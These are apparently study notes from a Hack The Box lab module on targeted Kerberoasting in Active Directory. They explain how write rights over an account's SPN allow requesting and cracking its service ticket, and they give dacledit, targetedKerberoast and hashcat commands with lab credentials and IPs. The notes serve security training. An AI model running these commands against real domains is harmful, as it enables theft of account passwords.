
---
---
[Kerberoasting](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/detecting-ldap-based-kerberoasting-with-azure-atp/ba-p/462448) is a post-exploitation attack that takes advantage of the way `Service Principal Names` (`SPNs`) are used in Active Directory for authentication. When a client requests a Kerberos TGS service ticket, it gets encrypted with the service account’s NTLM password hash. An attacker can obtain this ticket and perform offline password cracking to open it. If successful, the attacker can obtain the service account’s password. The success of this attack depends on the strength of the service account’s password. (Review the [Kerberos Attacks](https://academy.hackthebox.com/module/details/25) module to learn about `Kerberoasting` and other `Kerberos` attacks.)

When an attacker possesses an account with the ability to edit the `servicePrincipalName` attribute of another user account in a domain, they can potentially make that account vulnerable to a `Kerberoasting` attack. By adding an `SPN` to the user account, the attacker can request a Kerberos TGS service ticket for that `SPN` and obtain it, encrypted with the user account's NTLM password hash. The attacker can then use offline password-cracking techniques to try to open the ticket and obtain the user account's password.

This is possible when the controlled account has `GenericAll`, `GenericWrite`, `WriteProperty`, `WriteSPN` or `Validated-SPN` over the target.

## Identifying Vulnerable Accounts

![targeted_kerberoast_bloodhound.png](https://academy.hackthebox.com/storage/modules/219/targeted_kerberoast_bloodhound.png)

```bash
python3 examples/dacledit.py -principal pedro -target Rita -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```

## Targeted Kerberoasting From Linux

```bash
anas21@htb[/htb]$ python3 targetedKerberoast.py -vv -d inlanefreight.local -u pedro -p SecuringAD01 --request-user rita --dc-ip 10.129.205.81
```

## Cracking the kerberoastable hash

```bash
anas21@htb[/htb]$ hashcat -m 13100 /tmp/rita.hash /usr/share/wordlists/rockyou.txt --force
```

---
---
## Note

```c
Note: If we get the error "Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)" while running targetedKerberoast.py or any other tool from Linux that use Kerberos as an authentication protocol, we need to sync the Linux machine's clock with the Active Directory DC's clock, using the ntpdate command, for example, sudo ntpdate DC_IP_ADDRESS.
```


```c
timedatectl set-ntp 0
sudo apt install ntpdate -y
sudo ntpdate 10.129.205.81
```

---
---
